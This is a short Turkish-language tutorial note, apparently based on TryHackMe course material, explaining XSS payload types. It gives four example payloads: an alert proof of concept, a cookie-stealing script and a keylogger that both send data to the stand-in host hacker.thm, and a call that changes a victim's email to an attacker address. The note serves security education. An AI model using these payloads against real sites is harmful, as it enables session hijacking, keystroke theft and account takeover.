# Payload Nedir?

XSS bağlamında **payload**, hedefin bilgisayarında (tarayıcısında) çalışmasını istediğimiz JavaScript kodudur. Bir payload temel olarak iki kısımdan oluşur:
1. **Intention (Amaç):** JavaScript kodunun tam olarak ne yapmasını istediğinizdir.
2. **Modification (Modifikasyon):** Her senaryo farklı olduğu için, kodun ilgili alanda sorunsuz çalışabilmesi adına yapılan değişiklikler ve filtre atlatma (evasion) düzenlemeleridir.

## XSS Payload Amaçları (Intentions)

Aşağıda farklı XSS amaçlarına yönelik örnekler bulunmaktadır:

### Proof Of Concept (PoC - Kavram Kanıtı)
- **Amaç:** Sadece bir web sitesinde XSS zafiyeti elde edebildiğinizi kanıtlamak ve göstermek için kullanılır. En basit payload türüdür.
- **Yöntem:** Sayfada basit bir uyarı (alert) kutusu çıkartmak.
- **Örnek Kod:**  <script>alert('XSS');</script>

### Session Stealing (Oturum Çalma)

- **Amaç:** Hedef kullanıcının oturum belirteçleri (login tokens) gibi detaylarını barındıran çerezlerini (cookies) ele geçirmek.
    
- **Yöntem:** Hedefin çerezini alır, başarılı bir şekilde iletilebilmesi için Base64 ile kodlar (encode eder) ve saldırganın kontrolündeki bir sunucuya gönderir. Saldırgan bu çerezlerle kurbanın oturumunu tamamen devralabilir.
    
- **Örnek Kod:**    <script>fetch('[https://hacker.thm/steal?cookie=](https://hacker.thm/steal?cookie=)' + btoa(document.cookie));</script>
    

### Key Logger (Tuş Kaydedici)

- **Amaç:** Kullanıcının web sayfasında klavyede bastığı her tuşu anlık olarak kaydetmek.
    
- **Yöntem:** Sayfa üzerindeki tuş basımlarını (onkeypress) dinler ve basılan tuşları saldırganın sunucusuna iletir. Özellikle giriş panelleri veya kredi kartı formlarında son derece tehlikelidir.
    
- **Örnek Kod:**    <script>document.onkeypress = function(e) { fetch('[https://hacker.thm/log?key=](https://hacker.thm/log?key=)' + btoa(e.key) );}</script>
    

### Business Logic (İş Mantığı Manipülasyonu)

- **Amaç:** Diğer örneklere göre çok daha spesifiktir. Uygulamanın kendi içindeki belirli bir ağ kaynağını veya JavaScript fonksiyonunu çağırmayı hedefler.
    
- **Yöntem:** Örneğin, sitede kullanıcının e-posta adresini değiştiren `user.changeEmail()` adında bir fonksiyon varsa, saldırgan bu fonksiyonu kendi e-posta adresiyle çağırır. E-posta adresi değiştikten sonra saldırgan parola sıfırlama saldırısı gerçekleştirebilir.
    
- **Örnek Kod:**    <script>user.changeEmail('attacker@hacker.thm');</script>